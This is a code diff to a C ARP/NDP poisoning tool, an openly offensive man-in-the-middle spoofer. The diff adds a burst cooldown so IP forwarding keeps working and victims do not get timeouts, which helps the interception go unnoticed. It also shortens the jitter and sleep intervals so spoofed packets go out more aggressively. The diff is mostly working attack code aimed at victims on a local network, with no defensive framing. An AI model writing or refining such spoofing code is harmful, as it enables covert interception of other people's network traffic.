@@ -55,6 +55,15 @@ static unsigned char *g_poison_my_mac = NULL;
 void execute_poison_burst(void) {
   if (g_poison_sockfd == -1 || !g_poison_victims) return;
 
+  // Rate-limit bursts: gateway packets arrive continuously and each triggers
+  // a callback. Without a cooldown, bursts chain back-to-back endlessly
+  // (new packets buffer during burst → recv returns instantly → new burst),
+  // starving the CPU and preventing IP forwarding → ERR_TIMED_OUT on victims.
+  static time_t last_burst = 0;
+  time_t now = time(NULL);
+  if (now - last_burst < 1) return; // Min 1s between bursts
+  last_burst = now;
+
   unsigned char broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
   int burst_count = 3 + (rand() % 5); // 3-7 rounds (#7)
@@ -86,7 +95,7 @@ void execute_poison_burst(void) {
                         g_poison_gateway_ipv6_ll);
     }
 
-    usleep(5000 + (rand() % 16000)); // 5-20ms jitter (#7)
+    usleep(1000 + (rand() % 4000)); // 1-5ms jitter (#7)
   }
 }
 
@@ -242,9 +251,9 @@ void start_wide_poisoning(unsigned char *gateway_ip, unsigned char *gateway_mac,
       send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll);
     }
 
-    int sleep_sec = 1 + (rand() % 3); // 1-3s randomized (#7)
-    log_printf("Wide-mode cycle complete. Sleeping %ds...\n", sleep_sec);
-    sleep(sleep_sec);
+    int sleep_ms = 100 + (rand() % 200); // 100-300ms randomized (#7)
+    log_printf("Wide-mode cycle complete. Sleeping %dms...\n", sleep_ms);
+    usleep(sleep_ms * 1000);
   }
 
   free(my_mac);
@@ -405,8 +414,6 @@ void start_poisoning(struct Victim *victims, int victim_count,
   g_poison_sockfd = sockfd;
   g_poison_my_mac = my_mac;
 
-  srand(time(NULL)); // Seed RNG for randomized timing (#7)
-
   set_burst_callback(execute_poison_burst);
   init_rate_monitor(gateway_mac, gateway_ip, gateway_ipv6_ll, my_mac);
 
@@ -447,8 +454,8 @@ void start_poisoning(struct Victim *victims, int victim_count,
     // Add small jitter to interval (#7)
     float jitter = ((rand() % 201) - 100) / 1000.0f; // ±0.1s
     float sleep_time = interval + jitter;
-    if (sleep_time < 0.2f) sleep_time = 0.2f;
-    log_printf("Poison sent. Sleeping %.1fs...\n", sleep_time);
+    if (sleep_time < 0.05f) sleep_time = 0.05f;
+    log_printf("Poison sent. Sleeping %.2fs...\n", sleep_time);
     usleep((useconds_t)(sleep_time * 1000000));
   }
 
